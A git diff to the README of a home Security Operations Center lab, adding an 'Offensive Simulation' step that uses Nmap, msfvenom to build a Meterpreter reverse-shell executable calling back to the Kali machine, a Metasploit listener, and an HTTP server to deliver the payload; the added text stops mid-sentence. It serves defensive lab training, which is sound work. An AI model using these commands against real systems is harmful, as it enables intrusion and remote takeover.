@@ -38,7 +38,7 @@ This project details the setup of a fundamental Security Operations Center (SOC)
 4. <b>Log Ingestion and Analysis:</b> Configuration of Splunk to ingest Sysmon-generated logs, followed by analysis of these logs to identify and interpret attack patterns.
 
 
-
+<p>
 <h2>Project Walkthrough</h2>
 <h3> Step 1: Virtual Machine Setup </h3>
 1. Download VirtualBox and its associated hash file. Verify the integrity of the downloaded VirtualBox installer by comparing its SHA256 hash with the one provided on the official VirtualBox website. This confirms that the file was not corrupted during transit. <br>
@@ -113,6 +113,40 @@ This project details the setup of a fundamental Security Operations Center (SOC)
 <br>
 <h3> Step 4: Offensive Simulation (Kali Linux VM & Windows 10 VM)</h3>
 1. From the Kali Linux machine, use Nmap (e.g., nmap -A [Windows_VM_IP_Address] -Pn) to scan the Windows 10 VM and identify open ports and services.
+<br>
+<img src="https://i.imgur.com/YTJAUkw.png" alt="Basic Home SOC Lab Steps"/>
+<br>
+2. Use msfvenom to create a malware payload designed to establish a reverse shell.
+<br>
+<img src="https://i.imgur.com/OqC0ItW.png" alt="Basic Home SOC Lab Steps"/>
+<br>
+Identify available payloads using <i>msfvenom --l payloads </i>
+<br>
+<img src="https://i.imgur.com/PDdvU4u.png" alt="Basic Home SOC Lab Steps"/>
+<br>
+Select the <i>windows/x64/meterpreter_reverse_tcp</i> payload.
+<br>
+<img src="https://i.imgur.com/i9se2bg.png" alt="Basic Home SOC Lab Steps"/>
+<br>
+Construct the malware using a command similar to <i>msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=[Kali_IP] LPORT=[Port] -f exe -o malware.exe </i>, where LHOST is the Kali Linux machine's IP address. 
+<br>
+<img src="https://i.imgur.com/F7dYAZe.png" alt="Basic Home SOC Lab Steps"/>
+<br>
+3. Set Up Metasploit Listener. Open <i>msfconsole</i> on the Kali Linux Machine. Configure a multi-handler to listen for the incoming connection by setting the payload type <i>set payload windows/x64/meterpreter_reverse_tcp</i> and the LHOST to the Kali Linux VM's IP Address. Then start the exploit with the command <i>exploit</i> to initiate the listener
+<br>
+<img src="https://i.imgur.com/bRgFSm1.png" alt="Basic Home SOC Lab Steps"/>
+<br>
+<img src="https://i.imgur.com/6z0fqr0.png" alt="Basic Home SOC Lab Steps"/>
+<br>
+<img src="https://i.imgur.com/CpisCKg.png" alt="Basic Home SOC Lab Steps"/>
+<br>
+<img src="https://i.imgur.com/FuSSrUn.png" alt="Basic Home SOC Lab Steps"/>
+<br>
+<img src="https://i.imgur.com/R0p7T2M.png" alt="Basic Home SOC Lab Steps"/>
+<br>
+4. Host Payload wiht HTTP Server. Set up a simple HTTP server on the Kali Linux machine to host the generated malware payload, allowing the Windows VM to download it. This typically involves opening a new terminal tab and using a command like 
+
+</p>
 <br>
 <img src="" alt="Basic Home SOC Lab Steps"/>
 <br>
